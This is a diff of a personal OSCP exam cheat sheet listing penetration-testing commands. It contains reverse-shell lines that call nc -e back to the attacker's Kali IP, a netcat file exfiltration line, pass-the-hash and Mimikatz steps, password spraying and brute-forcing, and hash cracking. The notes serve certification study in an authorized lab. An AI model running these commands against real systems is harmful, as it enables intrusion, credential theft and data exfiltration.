@@ -5,17 +5,15 @@ permalink: /oscp_notes/
 author_profile: true
 ---
 
-### Disclaimer - This page is meant as a personal reference page; there exist better places on the internet to learn penetration testing concepts and commands. Furthermore, this template is rendering markdown in a way that is not consistent with any editor I seem to find. As such, some tweaks may be required. 
+Disclaimer - This page is meant as a personal reference page for particular syntax and reminders of things to check for the OSCP specifically. There exist better places on the internet to learn penetration testing concepts and commands. Furthermore, this template is rendering markdown in a way that is not consistent with any editor I seem to find. As such, some tweaks may be required. 
 
 # Preliminary Scanning 
 ## nmap
--   Initial scan - output=$(sudo nmap -p- $IP --min-rate 500); echo "$output"; echo -n "Ports: "; echo "$output" \| grep '/tcp' \| cut -d '/' -f 1 \| paste -sd ','
--   Then more detailed - Nmap -A -sC -p($ports) $IP
+-   Initial scan: output=$(sudo nmap -p- $IP --min-rate 500); echo "$output"; echo -n "Ports: "; echo "$output" \| grep '/tcp' \| cut -d '/' -f 1 \| paste -sd ','
+-   Then more detailed: Nmap -A -sC -p($ports) $IP
 	- Where the open ports from the previous scan follow the -p flag
 	- Ex: -p22,80,445
--   nmap -sS -Pn -p- $IP
-	- Checks all ports - run this after getting started on the first scan because it takes a while
--   Nmap -sU $IP
+- Nmap -sU $IP
 - Nmap Scripting Engine
 	- The nmap scripting engine can also be used for more thorough scanning
 	- nmap --script=\<script1>\.nse, \<script2>\.nse $IP
@@ -33,7 +31,8 @@ author_profile: true
 - gobuster dir -u http://hosts -w /wordlists/Discovery/Web-Content/big.txt -t 4 --delay 1s -o results.txt
 	- Where the resulting output is called results.txt
 - gobuster dir -u https://host -w /wordlists/$wordlist.txt  -x .php, .txt  -t 4
-	- Where you are searching for php and txt files
+	- Where you are searching for php and txt files <br>
+
 ### feroxbuster 
 - feroxbuster -u \<url>
 - feroxbuster -u \<url> -w \<wordlists>
@@ -45,6 +44,7 @@ author_profile: true
 
 ## Directory Traversal
 On Linux, we can use the /etc/passwd file to test directory traversal vulnerabilities. On Windows, we can use the file C:\Windows\System32\drivers\etc\hosts to test directory traversal vulnerabilities, which is readable by all local users. In Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of /etc/passwd. Check for private keys in their home directory, and use them to access the system via SSH.
+- https://github.com/jcesarstef/dotdotslash/blob/master/match.py
 
 ## Encoding Notes
 %20 = " " and %5C = "\"
@@ -138,6 +138,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 5. EXECUTE xp_cmdshell 'whoami';
 
 # SMB
+- smbclient -L \<target> -N
 - smbclient -L \<target> -U \<user>
 - smbclient //\<target>/\<share> -U \<user>%\<password>
 - smbclient //\<target>/\<share> -U \<user> --pw-nt-hash \<NTLM hash>
@@ -145,13 +146,18 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 	- to download file
 - smbclient //\<target>/\<share> --directory path/to/directory --command "put file.txt"
 	- to upload file
+- smbmap -H $IP -u ""
+	- to check for available shares
 <br>
-# SMTP
+
+# SMTP <br>
+
 ### onesixtyone
 - onesixtyone -c \<file containing community strings (public, private, manager)> -i \<file containing target ips>
 - Note that there are seclists with common community strings
 	- SecLists/Miscellaneous/wordlist-common-snmp-community-strings.txt
 	- SecLists/Miscellaneous/snmp.txt
+<br>
 ### snmpwalk
 - snmpwalk -c public -v1 -t 10 \<target ip>
 	- other community strings besides public include private and manager
@@ -213,14 +219,20 @@ Get-History - may not work
 - Download file from remote server
 	- iwr -uri http://\<server IP>/file.ext -outfile file.ext\
 <br>
+
 ### Checking privileges on service binaries
   - icacls (Windows utility) or  
   - Get-ACL (PowerShell Cmdlet)
- <br>
-### winpeas.exe
-./winpeas.exe
 <br>
-## Active Directory
+
+### Auto Tools
+./winpeas.exe
+./adPEAS.ps1
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+
+<br>
+## Active Directory (https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
+
 ### PowerView.ps1
 (Import-Module .\PowerView.ps1)
 (May Need "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser")
@@ -251,7 +263,9 @@ Get-History - may not work
           #Displays the vulnerable user and their AS-REP hash
           .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
           # Displays the vulnerable user and their TGS-REP hash
+<br>
 ## Privilege Escalation
+<br>
 ### Mimikatz
  1. privilege::debug
  2. token::elevate
@@ -268,12 +282,14 @@ Invoke-AllChecks
 
 ### Potato Family
 - PrintSpoofer: .\PrintSpoofer.exe -c "nc.exe \<kali $IP> \<listening port> -e cmd"
--  GodPotato:  .\GodPotato -cmd “nc -t -e C:\Windows\System32\cmd.exe \<kali IP> \<port>
+- GodPotato:  .\GodPotato -cmd “nc -t -e C:\Windows\System32\cmd.exe \<kali IP> \<port>
+- .\SweetPotato.exe -e efsrpc '/temp/r.exe'
   
 
 # Linux Foothold
 ## Enumeration
 - id
+- sudo -l
 - cat /etc/passwd
 	- If you can somehow edit:
 	- openssl passwd \<new password>
@@ -288,6 +304,7 @@ Invoke-AllChecks
 - ss -anp or netstat
 - dpkg -l (to list applications installed by dpkg)
 - find / -writable -type d 2>/dev/null (find writable directories)
+- find / -type f -perm -u=s 2>/dev/null
 - cat any /home/.history files
 - check /home/.ssh for keys
 - su root (can't hurt to try)
@@ -313,23 +330,23 @@ OR
 **Basic usage**
 <br>
 From Kali:
-		- sudo ip tuntap add user pop mode tun ligolo
-		- sudo ip link set ligolo up
-		- sudo ip route add \<target ip.0/24> dev ligolo
-		- ./proxy -selfcert
+- sudo ip tuntap add user pop mode tun ligolo
+- sudo ip link set ligolo up
+- sudo ip route add \<target ip.0/24> dev ligolo
+- ./proxy -selfcert
 <br>
 From Windows Target (agent file):
-		- .\ligolo.exe -connect \<kali IP>:11601 -ignore-cert
+- .\ligolo.exe -connect \<kali IP>:11601 -ignore-cert
 <br>
 From Linux Target (agent file):
-		- ligolo -connect \<kali IP>:11601 -ignore-cert
+- ligolo -connect \<kali IP>:11601 -ignore-cert
 <br>
 Then from Kali:
-		- Session
-		- 1
-		- Start
-		- listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:6666
-			- This allows you to access port 5555 on target from 127.0.0.1:6666 (kali machine). 
+- Session
+- 1
+- Start
+- listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:6666
+	- This allows you to access port 5555 on target from 127.0.0.1:6666 (kali machine). 
 <br>
  **Local Port Forwarding:**
 	- `ip route add 240.0.0.1/32 dev`
@@ -345,6 +362,10 @@ While the OSCP Lab discusess other tools such as socat, sshuttle, and plink, I f
 	- powershell - iwr -uri http://\<kali IP>:\<serving port>/file -outfile file
 - From target Linux:
 	- wget http://\<kali IP>:\<serving port>/file
+<br>
+### Over NC
+- on target: nc -w 3 192.168.45.230 4444 < file.txt
+   on kali: nc -lvnp 4444 > file.txt
 ### Over RDP
 - xfreerdp /u:admin /p:password /v:10.10.172.151 /drive:\/<directory>,\<name>
 <br>
@@ -357,17 +378,20 @@ While the OSCP Lab discusess other tools such as socat, sshuttle, and plink, I f
 <br>
 ### SSH/SCP
 scp -P \<ssh port> \<file to copy> user@\<destination IP>:\<destination folder>
- <br>
+<br>
+
 ### wsgidav
 wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /<directory you want to share>
 - host specifies the host to listen to, "0.0.0.0" means all interaces, "--auth=anonymous" disables authentication (fine for sharing specific files during this context), and the "--root" flag specifies the directory to share. 
 
 
 # Tool Syntax
-## Crackmapexec
-crackmapexec smb <IP> -u <user file> -p '<password>' -d domain.com --continue-on-success
+## Netexec (formerly crackmapexec)
+nxc smb $IP -u $user -p '$password' -d domain.com --continue-on-success
+
 ## Kerbrute
 .\kerbrute_windows_amd64.exe passwordspray -d domain.com .\usernames.txt "<password>"
+
 ## Impacket
 ### mssqlclient
 impacket-mssqlclient \<user>:\<pass>@\<target> -windows-auth
@@ -376,7 +400,9 @@ impacket-mssqlclient \<user>:\<pass>@\<target> -windows-auth
 - impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@/<target> (can be 0/24)
 	- Requires an SMB connection through the firewall, the Windows File and Printer Sharing feature must be enabled, and the admin share called ADMIN$ must be available. 
 <br>
+
 ## Metasploit
+
 ### Initial Usage
 Selecting a module:
   - show auxiliary - shows auxiliary modules
@@ -439,17 +465,20 @@ Payloads (msfvenom)
 - hydra -l \<user>-P /usr/share/wordlists/rockyou.txt $IP http-post-form " /index.php:fm_usr=user&fm_pwd=\^PASS^:Login failed. Invalid"
 - Basic Auth
 	- hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.206.201 http-get
+<br>
 ### Hashcat
 - hashcat -m 0 \<hashfile> /usr/share/wordlists/rockyou.txt -r 15222.rule --force --show
 - hashcat -m 13400 \<keepass hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show
 - check hashcat for which mode to use (searching for KeePass in this case)
 	- hashcat --help \| grep -i "KeePass" 
 	- hashcat -h \| grep -i "ssh"
+<br>
 ### john the ripper
 - ssh2john id_rsa > ssh.hash 
 - keepass2john \<database_name>.kdbx > keepass1.hash
 <br>
 ## ssh
+
 ### creating ssh key
 - ssh-keygen
 - ssh -p 2222(unless 22) -i created_key(no pub) user@host.com
@@ -459,7 +488,7 @@ Payloads (msfvenom)
 1. may need to chmod 600 id_rsa (too many permissions won't work)
 2. ssh2john id_rsa > ssh.hash
 3. remove "id_rsa:" from ssh.hash
-4. hashcat -h | grep -i "ssh" (22921 for example)
+4. hashcat -h \| grep -i "ssh" (22921 for example)
 5. hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
 
 ## Swaks (Sending email from command line when you have creds for mail server)
@@ -469,7 +498,7 @@ Payloads (msfvenom)
 <br>
 ## Wordpress Cheatsheet
 ### wpscan
-- wpscan --url http://\<url --api-token \<APItoken>
+- wpscan --url http://\<url> --api-token \<APItoken>
 ### reverse shell Wordpress plugin
 
 	    <?php
@@ -530,7 +559,7 @@ As these are my OSCP notes, and there is no longer a buffer overflow machine on 
 ## Upgrading Shells to fully interactive
 <br>
 ### Python
-1. python -c 'import pty; pty.spawn("/bin/bash")'
+1. python3 -c 'import pty; pty.spawn("/bin/bash")'  (or python)
 2. background reverse shell using CTRL-Z
 3. echo $TERM
 4. stty -a
